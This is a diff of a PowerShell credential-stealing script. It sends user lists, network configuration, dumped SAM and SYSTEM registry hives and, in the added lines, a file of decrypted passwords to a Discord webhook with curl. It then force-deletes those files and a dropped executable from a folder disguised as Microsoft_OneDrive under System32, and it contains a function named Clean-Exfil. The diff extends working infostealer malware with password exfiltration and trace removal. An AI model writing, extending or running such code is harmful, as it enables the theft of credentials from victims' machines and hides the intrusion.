@@ -33,8 +33,10 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\decrypted_password.csv
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save
+
 
 
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt" -r -Force -ErrorAction SilentlyContinue
@@ -42,6 +44,8 @@ rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt" -r -Force -Erro
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save" -r -Force -ErrorAction SilentlyContinue
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save" -r -Force -ErrorAction SilentlyContinue
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe" -r -Force -ErrorAction SilentlyContinue
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\decrypted_password.csv" -r -Force -ErrorAction SilentlyContinue
+
 
 function Clean-Exfil { 
 
